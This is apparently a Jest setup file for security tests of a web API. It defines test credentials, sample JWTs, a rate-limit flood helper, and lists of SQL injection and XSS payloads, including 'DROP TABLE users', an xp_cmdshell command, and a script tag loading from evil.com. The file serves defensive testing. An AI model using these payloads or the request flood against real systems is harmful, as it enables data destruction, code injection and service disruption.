/**
 * Security Test Setup
 * Configures environment for security and penetration tests
 */

import { beforeAll, afterAll, beforeEach, afterEach } from '@jest/globals';

// Security test configuration
global.securityConfig = {
  // Test user credentials for auth testing
  testUsers: {
    admin: {
      email: 'admin@test.com',
      password: 'SecureP@ssw0rd!',
      role: 'admin',
    },
    user: {
      email: 'user@test.com', 
      password: 'UserP@ssw0rd!',
      role: 'user',
    },
    unauthorized: {
      email: 'unauthorized@test.com',
      password: 'WrongP@ssw0rd!',
      role: null,
    },
  },
  
  // SQL injection test payloads
  sqlInjectionPayloads: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "1' UNION SELECT * FROM users --",
    "'; EXEC xp_cmdshell('dir'); --",
    "' OR 1=1#",
    "admin'--",
    "admin'/*",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "1' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables)='A'--",
  ],
  
  // XSS test payloads
  xssPayloads: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'+alert('XSS')+'",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<<SCRIPT>alert('XSS')<</SCRIPT>",
    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
  ],
  
  // CSRF test configuration
  csrfTestConfig: {
    validToken: 'valid-csrf-token-123',
    invalidToken: 'invalid-csrf-token-456',
    maliciousOrigin: 'https://evil.com',
  },
  
  // Rate limiting test configuration
  rateLimitConfig: {
    maxRequests: 100,
    timeWindow: 60000, // 1 minute
    testEndpoints: [
      '/api/v1/chat/conversations',
      '/api/v1/documents',
      '/api/v1/analytics/metrics',
    ],
  },
};

// Mock security utilities
global.securityUtils = {
  generateMaliciousPayload: (type, customPayload) => {
    const payloads = global.securityConfig[`${type}Payloads`] || [];
    return customPayload || payloads[Math.floor(Math.random() * payloads.length)];
  },
  
  createMaliciousRequest: (endpoint, payload, method = 'POST') => ({
    method,
    url: endpoint,
    headers: {
      'Content-Type': 'application/json',
      'Origin': global.securityConfig.csrfTestConfig.maliciousOrigin,
    },
    body: JSON.stringify({ maliciousInput: payload }),
  }),
  
  simulateRateLimitAttack: async (endpoint, requestCount = 150) => {
    const promises = [];
    for (let i = 0; i < requestCount; i++) {
      promises.push(
        fetch(endpoint, {
          method: 'GET',
          headers: { 'User-Agent': `Attack-Bot-${i}` },
        })
      );
    }
    return Promise.allSettled(promises);
  },
};

// Mock authentication for security tests
global.authMocks = {
  validJWT: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
  expiredJWT: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkV4cGlyZWQgVXNlciIsImV4cCI6MTUxNjIzOTAyMn0.invalid',
  malformedJWT: 'invalid.jwt.token',
  adminJWT: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.admin-token',
};

// Set up test environment
beforeAll(() => {
  // Mock console for security tests
  global.console = {
    ...console,
    log: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
  };
  
  // Mock crypto for security tests
  if (typeof crypto === 'undefined') {
    const { webcrypto } = require('crypto');
    global.crypto = webcrypto;
  }
});

beforeEach(() => {
  // Reset security test state
  jest.clearAllMocks();
});

afterEach(() => {
  // Clean up after each security test
  jest.restoreAllMocks();
});

afterAll(() => {
  // Clean up after all security tests
});

// Increase timeout for security tests
jest.setTimeout(45000);